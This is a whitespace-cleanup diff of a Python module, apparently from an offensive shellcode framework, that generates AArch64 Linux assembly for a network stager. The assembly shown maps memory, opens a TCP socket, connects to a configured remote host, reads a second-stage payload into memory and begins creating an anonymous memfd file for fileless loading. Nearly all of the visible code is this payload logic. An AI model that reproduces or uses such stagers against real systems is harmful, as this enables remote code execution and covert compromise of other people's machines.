@@ -4,9 +4,9 @@ import ctypes
 import struct
 
 from sickle.common.lib.generic import extract
-from sickle.common.lib.generic import convert 
+from sickle.common.lib.generic import convert
 from sickle.common.lib.generic import modparser
-from sickle.common.lib.reversing import mappings 
+from sickle.common.lib.reversing import mappings
 from sickle.common.lib.programmer import builder
 
 from sickle.common.lib.reversing.assembler import Assembler
@@ -14,7 +14,7 @@ from sickle.common.lib.reversing.assembler import Assembler
 from sickle.common.headers.linux import (
     memfd,
     fcntl,
-    netinet_in,    
+    netinet_in,
     bits_socket,
     bits_mman_linux,
     bits_mman_shared,
@@ -151,7 +151,7 @@ create_allocation:
     //            int prot,           // x2 => (PROT_READ | PROT_WRITE)
     //            int flags,          // x3 => MAP_PRIVATE | MAP_ANONYMOUS)
     //            int fd,             // x4 => Create anonymous mapping
-    //            off_t offset);      // x5 => Offset      
+    //            off_t offset);      // x5 => Offset
     eor x0, x0, x0
     mov x1, #{self.sock_buffer_size}
     mov x2, #{bits_mman_linux.PROT_READ | bits_mman_linux.PROT_WRITE}
@@ -163,17 +163,17 @@ create_allocation:
     svc #0x1337
     str x0, [x29, #-{self.storage_offsets['mapping']}]
 
-create_sockfd:                                                                                                          // x8 => socket(int domain,    // x0 => AF_INET        
+create_sockfd:
     //              int type,      // x1 => SOCK_STREAM
     //              int protocol); // x2 => IPPROTO_TCP
     mov x0, #{bits_socket.AF_INET}
     mov x1, #{bits_socket.SOCK_STREAM}
     mov x2, #{netinet_in.IPPROTO_TCP}
-    mov x8, #{self.syscalls['socket']}                                          
+    mov x8, #{self.syscalls['socket']}
     svc #0x1337
     str x0, [x29, #-{self.storage_offsets['sockfd']}]
 
-connect:                                                                                                                // x8 => connect(int sockfd,                   // x0 => sockfd
+connect:
     //               const struct sockaddr *addr,  // x1 => sockaddr struct
     //               socklen_t addrlen;            // x2 => sizeof(sockaddr struct)
     sub x1, x29, {self.storage_offsets['addr']}
@@ -194,8 +194,8 @@ connect:                                                                        
     str x0, [x1]
 
     ldr x0, [x29, #-{self.storage_offsets['sockfd']}]
-   
-    sub x1, x29, #{self.storage_offsets['addr']} 
+
+    sub x1, x29, #{self.storage_offsets['addr']}
 
     mov x2, #{ctypes.sizeof(netinet_in.sockaddr)}
     mov x8, #{self.syscalls['connect']}
@@ -230,9 +230,9 @@ connect:                                                                        
 
 
             source_code += f"""
-    // x8 = write(int fd,                 // x0 
-    //            const void buf[.count], // x1 
-    //            size_t count);          // x2 
+    // x8 = write(int fd,                 // x0
+    //            const void buf[.count], // x1
+    //            size_t count);          // x2
     strb w0, [x29, #-{write_index}]
     ldr x0, [x29, #-{self.storage_offsets['sockfd']}]
     sub x1, x29, #{self.storage_offsets['buffer']}
@@ -244,7 +244,7 @@ connect:                                                                        
         source_code += f"""
 
 set_index:
-    eor x14, x14, x14 
+    eor x14, x14, x14
 
 download_stager:
     // x8 => read(int fd,        // x0 => sockfd
@@ -258,7 +258,7 @@ download_stager:
     svc #0x1337
 
     cmp x0, #0x00
-    b.eq download_complete    
+    b.eq download_complete
 
 adjust_allocation:
     ldr x15, [x29, #-{self.storage_offsets['mapping']}]
@@ -270,8 +270,7 @@ write_data:
     strb w10, [x15, x14, lsl #0]
     add x14, x14, #0x01
     add x9, x9, #0x01
-    sub x0, x0, #0x01    
- 
+    sub x0, x0, #0x01
     cmp x0, #0x00
     cbnz x0, write_data
 
@@ -306,6 +305,7 @@ download_complete:
 create_memory_file:
     // x8 => memfd_create(const char *name,     // x0 => *buffer
     //                     unsigned int flags); // x1 => MFD_CLOEXEC (0x01)
+
     sub x9, x29, #{self.storage_offsets['anon_file']}
     eor x0, x0, x0
     str x0, [x9]
